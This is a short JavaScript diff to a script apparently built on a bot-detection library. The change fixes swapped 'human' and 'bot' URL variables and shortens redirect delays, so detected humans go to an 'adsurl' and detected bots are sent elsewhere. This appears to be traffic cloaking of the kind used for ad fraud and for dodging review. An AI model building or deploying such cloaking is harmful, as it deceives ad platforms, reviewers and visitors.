@@ -1,5 +1,5 @@
 new jmbotdetector({
-    timeout: 500,
+    timeout: 5000,
     callback: function(result) {
 
         console.log('result:', result.tests)
@@ -8,8 +8,8 @@ new jmbotdetector({
             console.log(data.bot);
             console.log(data.human);
 
-            var human = data.bot;
-            var bot = data.human;
+            var human = data.human;
+            var bot = data.bot;
 
             if (result.cases.mousemove) {
 
@@ -40,7 +40,7 @@ new jmbotdetector({
                     localStorage.setItem('adsurl', human)
 
                     $(window).attr('location', human)
-                }, 5000);
+                }, 3000);
 
             } else {
                 var currentUrl = window.location.hostname;
@@ -69,7 +69,7 @@ new jmbotdetector({
 
                     $(window).attr('location', bot)
 
-                }, 5000);
+                }, 300);
             }
         })
 
